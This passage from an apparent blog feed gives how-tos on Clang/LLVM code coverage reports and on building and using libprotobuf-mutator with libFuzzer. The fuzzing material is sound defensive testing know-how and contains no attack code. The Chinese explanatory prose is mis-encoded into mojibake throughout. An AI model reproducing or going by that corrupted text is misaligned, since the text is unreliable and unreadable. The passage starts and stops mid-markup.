coverage</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20190111174252715_1005029405.png" alt="workflow"></p><p>å®é™…æ“ä½œè¡¨æ˜ï¼Œ coverage.py ä¸æ˜¯å¤ªå¥½ç”¨ã€‚ è¿˜æ˜¯éœ€è¦ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œæ¯”è¾ƒç¨³å¦¥ã€‚</p><h2 id="0-ç¼–è¯‘"><a href="#0-ç¼–è¯‘" class="headerlink" title="(0)  ç¼–è¯‘"></a>(0)  ç¼–è¯‘</h2><p>åœ¨ chromium é¡¹ç›®ä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>use_clang_coverage=true and is_component_build=false</code><br>å¦‚æœä¸æ˜¯ chromium é¡¹ç›®ï¼Œ åˆ™éœ€è¦è‡ªå·± æŒ‡å®šå‚æ•°ï¼Œ ä¾‹å¦‚åœ¨ skia é¡¹ç›®ä¸­ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼š</p><p>args.gn</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cc</span> = <span class="hljs-string">&quot;/home/henices/clang7/bin/clang&quot;</span><br><span class="hljs-attr">cxx</span> = <span class="hljs-string">&quot;/home/henices/clang7/bin/clang++&quot;</span><br><span class="hljs-attr">extra_cflags</span> = [ <span class="hljs-string">&quot;-fprofile-instr-generate&quot;</span>, <span class="hljs-string">&quot;-fcoverage-mapping&quot;</span> ]<br><span class="hljs-attr">extra_ldflags</span> = [ <span class="hljs-string">&quot;-fprofile-instr-generate&quot;</span>,  <span class="hljs-string">&quot;-fcoverage-mapping&quot;</span> ]<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯è‡ªå·±çš„é¡¹ç›®ï¼Œä½¿ç”¨ clang ç¼–è¯‘æ—¶åŠ ä¸Šè¿™ä¸¤ä¸ªå‚æ•° -fprofile-instr-generate -fcoverage-mapping</p><h2 id="1-ç”Ÿæˆ-Raw-Profiles-æ–‡ä»¶"><a href="#1-ç”Ÿæˆ-Raw-Profiles-æ–‡ä»¶" class="headerlink" title="(1) ç”Ÿæˆ Raw Profiles æ–‡ä»¶"></a>(1) ç”Ÿæˆ Raw Profiles æ–‡ä»¶</h2><p><code>export LLVM_PROFILE_FILE=&quot;out/report/target.%4m.profraw&quot;</code>  ä½¿ç”¨è¿™ä¸ªå‘½ä»¤<br>é™åˆ¶ profraw æ–‡ä»¶çš„ä¸ªæ•°ã€‚</p><p>%p      è¿›ç¨‹ ID<br>%h      hostname<br>%Nm  ç”Ÿæˆå‡ ä¸ª profraw æ–‡ä»¶</p><p>å†™ä¸ªå¾ªç¯ï¼Œå°†æ‰€æœ‰çš„æ ·æœ¬è·‘ä¸€éã€‚ timeout 10 æŒ‡å®šç¨‹åºè¶…æ—¶æ—¶é—´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> path ; <span class="hljs-keyword">do</span> <span class="hljs-built_in">timeout</span> 10 target  <span class="hljs-variable">$i</span> ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>å°†åœ¨ out&#x2F;report ç›®å½•ä¸‹ï¼Œ ç”Ÿæˆ  profraw æ–‡ä»¶ï¼Œ å¦‚æœæ²¡æœ‰ç”Ÿæˆï¼Œ åˆ™è¯´æ˜ä¸Šé¢çš„ä»£ç ç¼–è¯‘å‡ºäº†é—®é¢˜ã€‚</p><h2 id="2-ç”Ÿæˆ-Indexed-Profile"><a href="#2-ç”Ÿæˆ-Indexed-Profile" class="headerlink" title="(2) ç”Ÿæˆ Indexed Profile"></a>(2) ç”Ÿæˆ Indexed Profile</h2><p><code>/home/henices/clang7/bin/llvm-profdata merge -j=1 -sparse -o out/report/coverage.profdata out/report/*.profraw</code></p><p>-sparse èƒ½å¤§å¹…å‡å° profraw æ–‡ä»¶å¤§å°</p><h2 id="3-ç”Ÿæˆ-Coverage-report"><a href="#3-ç”Ÿæˆ-Coverage-report" class="headerlink" title="(3) ç”Ÿæˆ Coverage report"></a>(3) ç”Ÿæˆ Coverage report</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/henices/clang7/bin/llvm-cov show -output-dir=out/report -format=html \<br>    -Xdemangler c++filt -Xdemangler -n -instr-profile=out/report/coverage.profdata \<br>    -object=out/coverage/target<br></code></pre></td></tr></table></figure><p>æ‰“å¼€ out&#x2F;report&#x2F;index.html å¯ä»¥çœ‹åˆ°è¯¦ç»†çš„ html æŠ¥å‘Šï¼Œéå¸¸ä¸é”™ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/20190118160208151_604337546.png" alt="llvm-coverge-html"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://www.chromium.org/developers/how-tos/get-the-code/working-with-release-branches">working with release branches</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/code_coverage.md">Code Coverage in Chromium</a></li><li><a href="http://logan.tw/posts/2015/04/28/check-code-coverage-with-clang-and-lcov/">Check Code Coverage with Clang and LCOV</a></li><li><a href="https://github.com/google/oss-fuzz/blob/master/infra/base-images/base-runner/coverage">oss-fuzz coverage</a></li><li><a href="https://clang.llvm.org/docs/SourceBasedCodeCoverage.html">Source-based Code Coverage</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libprotobuf-mutator ç®€å•åˆ†æ</title>
    <link href="/cn/libprotobuf-mutator/"/>
    <url>/cn/libprotobuf-mutator/</url>
    
    <content type="html"><![CDATA[<h2 id="What-are-protocol-buffers"><a href="#What-are-protocol-buffers" class="headerlink" title="What are protocol buffers?"></a><a href="https://developers.google.com/protocol-buffers/docs/overview">What are protocol buffers?</a></h2><p>Protocol buffers are Googleâ€™s language-neutral, platform-neutral, extensible mechanism for serializing structured data â€“ think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p><p>è¿™æ®µæ˜¯ Google å®˜æ–¹ç½‘ç«™ç»™å‡ºçš„ä»‹ç»ï¼Œprotobuf å¯ä»¥è‡ªåŠ¨åŒ–ç”Ÿæˆä»£ç ï¼Œç”¨äºè¯»å…¥æˆ–è€…å†™å…¥ç»“æ„åŒ–æ•°æ®ã€‚ä¸€ä¸ªç®€å•çš„ protobuf æ–‡ä»¶å¯ä»¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs protobuf"><span class="hljs-keyword">message </span><span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">int32</span> id = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">optional</span> <span class="hljs-type">string</span> email = <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…·ä½“çš„è¯­æ³•å¯ä»¥å‚è€ƒGoogle çš„æ–‡æ¡£ <a href="https://developers.google.com/protocol-buffers/docs/proto">proto2</a> å’Œ <a href="https://developers.google.com/protocol-buffers/docs/proto3">proto3</a>ã€‚c++ è¯­è¨€ä½¿ç”¨ protobuf çš„ç¤ºä¾‹å¯ä»¥å‚è§<a href="https://developers.google.com/protocol-buffers/docs/cpptutorial">Protocol Buffer Basics: C++</a> æ–‡æ¡£ï¼ŒåŸºæœ¬æ­¥éª¤æ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li>å†™ protobuf æ–‡ä»¶ï¼Œè¡¨è¾¾æ•°æ®ç»“æ„</li><li>åˆ©ç”¨ protoc è‡ªåŠ¨ç”Ÿæˆä»£ç  ï¼ˆæ”¯æŒå¤šç§è¯­è¨€ C++ Java ç­‰ï¼‰</li><li>åˆ©ç”¨ç”Ÿæˆçš„æ–‡ä»¶è§£ææˆ–è€…å†™å…¥ç›¸å…³æ•°æ®ç»“æ„</li></ol><h2 id="libprotobuf-mutator"><a href="#libprotobuf-mutator" class="headerlink" title="libprotobuf-mutator"></a>libprotobuf-mutator</h2><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><p>å‚è€ƒï¼š <a href="https://github.com/google/libprotobuf-mutator/blob/master/README.md">https://github.com/google/libprotobuf-mutator/blob/master/README.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/google/libprotobuf-mutator.git<br><span class="hljs-built_in">mkdir</span> build<br><span class="hljs-built_in">cd</span> build<br>cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug<br>https_proxy=http://127.0.0.1:3128 ninja check<br></code></pre></td></tr></table></figure><p>ç”±äºéœ€è¦ä»Googleä¸‹è½½ä¸€äº›æºç ï¼Œæ‰€ä»¥åœ¨ <code>ninja check</code> çš„æ—¶å€™éœ€è¦æŒ‚ä¸Šä»£ç†ï¼Œç»“æœç¼–è¯‘å‡ºé”™äº†ï¼Œæ‰¾ä¸åˆ° <code>libxml2.a</code>ï¼Œæ’æŸ¥ä¸€ä¸‹ç¼–è¯‘å‚æ•°ï¼Œå‘ç°éœ€è¦æ·»åŠ ç¼–è¯‘é™æ€åº“çš„å‚æ•°</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/cmake/external/libxml2.cmake b/cmake/external/libxml2.cmake</span><br><span class="hljs-comment">index c00ace2..a944fab 100644</span><br><span class="hljs-comment">--- a/cmake/external/libxml2.cmake</span><br><span class="hljs-comment">+++ b/cmake/external/libxml2.cmake</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span> ExternalProject_Add($&#123;LIBXML2_TARGET&#125;<br>     UPDATE_COMMAND &quot;&quot;<br>     CONFIGURE_COMMAND $&#123;LIBXML2_SRC_DIR&#125;/autogen.sh --without-python<br>                                                     --prefix=$&#123;LIBXML2_INSTALL_DIR&#125;<br><span class="hljs-addition">+                                                    --enable-static=yes</span><br>                                                     CC=$&#123;CMAKE_C_COMPILER&#125;<br>                                                     CXX=$&#123;CMAKE_CXX_COMPILER&#125;<br>                                                     CFLAGS=$&#123;LIBXML2_CFLAGS&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åå¯ä»¥æ­£å¸¸é€šè¿‡ <code>ninja check</code> å‘½ä»¤çš„æ‰€æœ‰æ£€æŸ¥ã€‚é»˜è®¤æƒ…å†µä¸‹ <code>ninja install</code> ä¼šå®‰è£…åˆ° &#x2F;usr&#x2F;local ç›®å½•ï¼Œå› ä¸ºè€ƒè™‘åˆ°åç»­éœ€è¦ç»™ <code>afl+</code>ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ä¸‹çš„å‘½ä»¤é‡æ–° cmake ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \<br>-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug<br></code></pre></td></tr></table></figure><h3 id="libprotobuf-mutator-ä»£ç å®ç°"><a href="#libprotobuf-mutator-ä»£ç å®ç°" class="headerlink" title="libprotobuf-mutator ä»£ç å®ç°"></a>libprotobuf-mutator ä»£ç å®ç°</h3><p>libfuzzer_macro.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto)                 \</span><br><span class="hljs-meta">  extern <span class="hljs-string">&quot;C&quot;</span> int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \</span><br><span class="hljs-meta">    using protobuf_mutator::libfuzzer::LoadProtoInput;                      \</span><br><span class="hljs-meta">    Proto input;                                                            \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (LoadProtoInput(use_binary, data, size, &amp;input))                     \</span><br><span class="hljs-meta">      TestOneProtoInput(input);                                             \</span><br><span class="hljs-meta">    return 0;                                                               \</span><br><span class="hljs-meta">  &#125;</span><br>  <br><span class="hljs-comment">// Defines custom mutator, crossover and test functions using default</span><br><span class="hljs-comment">// serialization format. Default is text.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_PROTO_FUZZER(arg) DEFINE_TEXT_PROTO_FUZZER(arg)</span><br><span class="hljs-comment">// Defines custom mutator, crossover and test functions using text</span><br><span class="hljs-comment">// serialization. This format is more convenient to read.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)</span><br><span class="hljs-comment">// Defines custom mutator, crossover and test functions using binary</span><br><span class="hljs-comment">// serialization. This makes mutations faster. However often test function is</span><br><span class="hljs-comment">// significantly slower than mutator, so fuzzing rate may stay unchanged.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_BINARY_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(true, arg)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE_PROTO_FUZZER_IMPL(use_binary, arg)                              \</span><br><span class="hljs-meta">  static void TestOneProtoInput(arg);                                          \</span><br><span class="hljs-meta">  using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt;             \</span><br><span class="hljs-meta">      std::function<span class="hljs-string">&lt;decltype(TestOneProtoInput)&gt;</span>::argument_type&gt;::type&gt;::type; \</span><br><span class="hljs-meta">  DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType)                \</span><br><span class="hljs-meta">  DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType)              \</span><br><span class="hljs-meta">  DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType)                \</span><br><span class="hljs-meta">  DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType)                     \</span><br><span class="hljs-meta">  static void TestOneProtoInput(arg)</span><br></code></pre></td></tr></table></figure><p>è°ƒç”¨è·¯å¾„ä¸º <code>DEFINE_PROTO_FUZZER</code> -&gt; <code>DEFINE_TEXT_PROTO_FUZZER</code> -&gt; <code>DEFINE_PROTO_FUZZER_IMPL</code> -&gt; <code>DEFINE_TEST_ONE_PROTO_INPUT_IMPL</code> -&gt; <code>LLVMFuzzerTestOneInput</code> -&gt; <code>TestOneProtoInput</code>ã€‚<br>æœ€ç»ˆè¿˜æ˜¯å®ç°äº†<code>LLVMFuzzerTestOneInput</code> libfuzzer çš„å…¥å£æ–¹æ³•ï¼Œä½¿ç”¨ macro å¯ä»¥å°‘å†™ä¸å°‘ä»£ç éå¸¸æ–¹ä¾¿ï¼Œä»è¿™é‡Œå°±å¯ä»¥çœ‹å‡º fuzz çš„ target function å¿…é¡»å’Œ <code>LLVMFuzzerTestOneInput</code> çš„å‚æ•°ç±»å‹ä¸€è‡´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// fuzz_target.cc</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">size_t</span> Size)</span> &#123;<br>  DoSomethingInterestingWithMyAPI(Data, Size);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// Non-zero return values are reserved for future use.</span><br>&#125;<br></code></pre></td></tr></table></figure><p>libfuzzer_macro.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">LoadProtoInput</span><span class="hljs-params">(<span class="hljs-type">bool</span> binary, <span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size,</span></span><br><span class="hljs-params"><span class="hljs-function">                    protobuf::Message* input)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetCache</span>()-&gt;<span class="hljs-built_in">LoadIfSame</span>(data, size, input)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">auto</span> result = binary ? <span class="hljs-built_in">ParseBinaryMessage</span>(data, size, input)<br>                       : <span class="hljs-built_in">ParseTextMessage</span>(data, size, input);<br>  <span class="hljs-keyword">if</span> (!result) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <span class="hljs-built_in">GetMutator</span>()-&gt;<span class="hljs-built_in">Seed</span>(size);<br>  <span class="hljs-built_in">GetMutator</span>()-&gt;<span class="hljs-built_in">Fix</span>(input);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LoadProtoInput</code> è¿”å› <code>true</code> æˆ–è€… <code>false</code>ï¼Œå¦‚æœè§£ææˆåŠŸï¼Œå°†è°ƒç”¨ <code>TestOneProtoInput</code>ï¼Œ<code>DEFINE_PROTO_FUZZER</code> macro å…¶å®å°±æ˜¯å†™ TestOneProtoInput çš„å®ç°ã€‚</p><h2 id="libprotobuf-mutator-fuzzing-learning"><a href="#libprotobuf-mutator-fuzzing-learning" class="headerlink" title="libprotobuf-mutator_fuzzing_learning"></a>libprotobuf-mutator_fuzzing_learning</h2><p>è¿™æ˜¯ github ä¸Šä¸€ä½åŒè¡Œå†™çš„å­¦ä¹  libprotobuf-mutator fuzzing çš„æ–‡ç« ï¼Œæ€»ä½“å†™çš„ä¸é”™ï¼Œä½†æ˜¯å…¶ä¸­æœ‰ä¸€äº›é”™è¯¯çš„åœ°æ–¹ï¼Œåœ¨å®è·µè¿‡ç¨‹ä¸­éƒ½è®°å½•äº†å…¶ä¸­çš„ä¿®æ”¹ã€‚</p><h3 id="Simple-protobuf-example"><a href="#Simple-protobuf-example" class="headerlink" title="Simple protobuf example"></a>Simple protobuf example</h3><p>æ–‡ç« ï¼š<a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf</a></p><p>å…ˆå†™ä¸€ä¸ªç®€å•çš„ protobuf æ–‡ä»¶ï¼Œtest.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto2&quot;</span>;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">TEST</span> &#123;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">uint32</span> a = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">required</span> <span class="hljs-type">string</span> b = <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>protoc</code> ç¼–è¯‘ protobuf æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> genfiles  <br>protoc ./test.proto --cpp_out=./genfiles<br></code></pre></td></tr></table></figure><p>å°†è‡ªåŠ¨ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> ./genfiles<br>test.pb.cc  test.pb.h<br></code></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªæµ‹è¯•ç¨‹åº test_proto.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;test.pb.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> std::cin;<br><span class="hljs-keyword">using</span> std::cout;<br><span class="hljs-keyword">using</span> std::endl;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    TEST t;<br>    t.<span class="hljs-built_in">set_a</span>(<span class="hljs-number">101</span>);<br>    t.<span class="hljs-built_in">set_b</span>(<span class="hljs-string">&quot;testtest&quot;</span>);<br>    cout &lt;&lt; t.<span class="hljs-built_in">a</span>() &lt;&lt; endl;<br>    cout &lt;&lt; t.<span class="hljs-built_in">b</span>() &lt;&lt; endl;   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>å†™ Makefile æ¥ç¼–è¯‘ <code>test_proto.cc</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CXX=clang++<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-section">test_proto: test_proto.cc <span class="hljs-variable">$(PB_SRC)</span></span><br><span class="hljs-variable">$(CXX)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm test_proto<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>make</code> åæŠ¥é”™ .&#x2F;test.pb.h:17:2: error: This file was generated by an older version of protoc which isï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨äº† <code>-DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON</code> ä¸‹è½½äº†æ–°ç‰ˆæœ¬çš„ protobufï¼Œæ‰€ä»¥å‡ºäº†è¿™ä¸ªé”™è¯¯ã€‚åªå¥½ä½¿ç”¨ä¸‹è½½çš„ protoc é‡æ–°ç”Ÿæˆ <code>test.pb.cc</code> å’Œ <code>test.pb.h</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/code/libprotobuf-mutator/build/external.protobuf/bin/protoc ./test.proto --cpp_out=./genfiles<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡å¯ä»¥æˆåŠŸ make äº†ï¼Œå®é™…æ‰§è¡Œçš„å‘½ä»¤æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang++ -o test_proto test_proto.cc test.pb.cc /home/henices/code/libprotobuf-mutator/build/external.protobuf//lib/libprotobufd.a \<br> -I/home/henices/code/libprotobuf-mutator/build/external.protobuf//include<br></code></pre></td></tr></table></figure><p>è¿è¡Œ <code>./test_proto</code>, è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">101<br>testtest<br></code></pre></td></tr></table></figure><h3 id="Combine-libprotobuf-mutator-with-libfuzzer"><a href="#Combine-libprotobuf-mutator-with-libfuzzer" class="headerlink" title="Combine libprotobuf-mutator with libfuzzer"></a>Combine libprotobuf-mutator with libfuzzer</h3><p>ä»£ç åœ¨ï¼š <a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer</a></p><p>harness.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FuzzTEST</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(data[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\x01&#x27;</span>) &#123;<br>        __builtin_trap();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ FuzzTEST æ˜¯æˆ‘ä»¬éœ€è¦æµ‹è¯•çš„ç›®æ ‡å‡½æ•°ã€‚</p><p>lpm_libfuzz.cc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 